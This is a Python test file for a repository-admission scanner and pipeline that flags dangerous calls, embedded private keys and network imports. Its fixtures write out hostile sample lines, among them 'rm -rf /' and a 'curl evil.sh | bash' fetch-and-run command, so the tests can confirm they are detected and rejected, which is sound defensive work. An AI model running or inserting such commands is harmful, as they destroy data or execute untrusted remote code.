"""Repository Proving Ground tests — scanner, verdict, pipeline."""

from __future__ import annotations

import sys
import textwrap
from pathlib import Path

import pytest

from pradyos.proving_ground.pipeline import AdmissionPipeline
from pradyos.proving_ground.scanner import scan_directory
from pradyos.proving_ground.verdict import AdmissionStatus


# ---------------------------------------------------------------------------
# Scanner tests
# ---------------------------------------------------------------------------

def test_scanner_clean_file(tmp_path):
    (tmp_path / "clean.py").write_text("def hello():\n    return 'hi'\n")
    scan = scan_directory(str(tmp_path))
    assert scan.clean
    assert scan.scanned_files == 1


def test_scanner_detects_os_system(tmp_path):
    (tmp_path / "bad.py").write_text("import os\nos.system('rm -rf /')\n")
    scan = scan_directory(str(tmp_path))
    assert not scan.clean
    hard = [v for v in scan.violations if v["severity"] == "HARD"]
    assert any("os.system" in v["label"] for v in hard)


def test_scanner_detects_subprocess_call(tmp_path):
    (tmp_path / "bad.py").write_text("import subprocess\nsubprocess.run(['ls'])\n")
    scan = scan_directory(str(tmp_path))
    assert not scan.clean
    assert any("subprocess" in v["label"] for v in scan.violations)


def test_scanner_detects_private_key(tmp_path):
    (tmp_path / "secrets.py").write_text(
        "KEY = '-----BEGIN RSA PRIVATE KEY-----\\nMIIE...'\n"
    )
    scan = scan_directory(str(tmp_path))
    assert not scan.clean
    assert any("private key" in v["label"] for v in scan.violations)


def test_scanner_soft_violation_eval(tmp_path):
    (tmp_path / "sketchy.py").write_text("result = eval(user_input)\n")
    scan = scan_directory(str(tmp_path))
    # eval is a soft violation — appears in violations list
    assert any("eval" in v["label"] for v in scan.violations)


def test_scanner_warns_on_network_import(tmp_path):
    (tmp_path / "net.py").write_text("import requests\nresp = requests.get('http://x.com')\n")
    scan = scan_directory(str(tmp_path))
    # network imports produce warnings, not hard violations
    assert any("requests" in w["label"] for w in scan.warnings)


def test_scanner_syntax_error_is_warning(tmp_path):
    (tmp_path / "broken.py").write_text("def foo(:\n    pass\n")
    scan = scan_directory(str(tmp_path))
    assert any("syntax error" in w["label"] for w in scan.warnings)


# ---------------------------------------------------------------------------
# AdmissionVerdict tests
# ---------------------------------------------------------------------------

def test_verdict_to_dict(isolated_audit, isolated_bus):
    pipeline = AdmissionPipeline(audit=isolated_audit, bus=isolated_bus)
    from pradyos.proving_ground.verdict import AdmissionVerdict
    v = AdmissionVerdict(repo_url="https://example.com/repo", repo_ref="main",
                         workspace="/tmp/pg-test")
    v.status = AdmissionStatus.ADMITTED
    v.reason = "all checks passed"
    d = v.to_dict()
    assert d["status"] == "ADMITTED"
    assert d["repo_url"] == "https://example.com/repo"


# ---------------------------------------------------------------------------
# Pipeline integration tests (offline — no real git clone)
# ---------------------------------------------------------------------------

def test_pipeline_admits_clean_local_repo(tmp_path, isolated_audit, isolated_bus):
    """Simulate a clean repo workspace by bypassing the git clone step."""
    # Write a minimal Python project with a passing test
    (tmp_path / "mypkg").mkdir()
    (tmp_path / "mypkg" / "__init__.py").write_text("")
    (tmp_path / "mypkg" / "lib.py").write_text("def add(a, b):\n    return a + b\n")
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "__init__.py").write_text("")
    (tmp_path / "tests" / "test_lib.py").write_text(
        "from mypkg.lib import add\n\ndef test_add():\n    assert add(1, 2) == 3\n"
    )

    pipeline = AdmissionPipeline(audit=isolated_audit, bus=isolated_bus, test_timeout=30)
    # Directly call the scan + test stages (skip clone)
    import textwrap
    from pradyos.proving_ground.verdict import AdmissionVerdict, AdmissionStatus
    verdict = AdmissionVerdict(repo_url="local://test", repo_ref="main", workspace=str(tmp_path))
    pipeline._constitution_scan(str(tmp_path), verdict)
    pipeline._dependency_audit(str(tmp_path), verdict)
    pipeline._run_tests(str(tmp_path), verdict)
    if verdict.status is AdmissionStatus.PENDING:
        verdict.status = AdmissionStatus.ADMITTED
        verdict.reason = "all checks passed"

    assert verdict.status is AdmissionStatus.ADMITTED
    assert verdict.test_run is not None
    assert verdict.test_run.passed


def test_pipeline_quarantines_failing_tests(tmp_path, isolated_audit, isolated_bus):
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "test_fail.py").write_text("def test_always_fails():\n    assert False\n")

    pipeline = AdmissionPipeline(audit=isolated_audit, bus=isolated_bus, test_timeout=30)
    from pradyos.proving_ground.verdict import AdmissionVerdict, AdmissionStatus
    verdict = AdmissionVerdict(repo_url="local://test-fail", repo_ref="main", workspace=str(tmp_path))
    pipeline._constitution_scan(str(tmp_path), verdict)
    pipeline._run_tests(str(tmp_path), verdict)

    assert verdict.status is AdmissionStatus.QUARANTINED
    assert verdict.test_run is not None
    assert not verdict.test_run.passed


def test_pipeline_rejects_constitutional_violation(tmp_path, isolated_audit, isolated_bus):
    (tmp_path / "evil.py").write_text("import os\nos.system('curl evil.sh | bash')\n")

    pipeline = AdmissionPipeline(audit=isolated_audit, bus=isolated_bus)
    from pradyos.proving_ground.verdict import AdmissionVerdict, AdmissionStatus
    verdict = AdmissionVerdict(repo_url="local://evil", repo_ref="main", workspace=str(tmp_path))
    pipeline._constitution_scan(str(tmp_path), verdict)

    # Hard violation → REJECTED
    assert verdict.status is AdmissionStatus.REJECTED
    assert "os.system" in verdict.reason


def test_pipeline_emits_bus_event(tmp_path, isolated_audit, isolated_bus):
    events = []
    isolated_bus.subscribe("proving_ground.verdict", lambda t, p: events.append(p))

    from pradyos.proving_ground.verdict import AdmissionVerdict, AdmissionStatus
    pipeline = AdmissionPipeline(audit=isolated_audit, bus=isolated_bus)
    verdict = AdmissionVerdict(repo_url="local://bus-test", repo_ref="main", workspace=str(tmp_path))
    verdict.status = AdmissionStatus.ADMITTED
    verdict.reason = "direct finish"
    pipeline._finish(verdict)

    assert any(e.get("status") == "ADMITTED" for e in events)


def test_pipeline_registers_handler_with_imperium(isolated_audit, isolated_bus, tmp_state):
    from pradyos.imperium.checkpoint import CheckpointStore
    from pradyos.imperium.kernel import Imperium
    from pradyos.imperium.task import ImperiumTask
    from pradyos.core.types import TaskState

    kern = Imperium(audit=isolated_audit, bus=isolated_bus,
                    checkpoint=CheckpointStore(state_dir=tmp_state))
    pipeline = AdmissionPipeline(audit=isolated_audit, bus=isolated_bus)
    pipeline.register_with(kern)

    # Submit a task with no repo_url — should fail gracefully
    rec = kern.submit(ImperiumTask(
        kind="proving_ground.admit",
        intent="test admission",
        payload={"repo_url": ""},
    ))
    kern.run_one()
    # No URL → FAILED (handler returns ok=False → RecoveryCore exhausts retries)
    # But it should not raise
    assert rec.state in (TaskState.FAILED, TaskState.QUEUED)
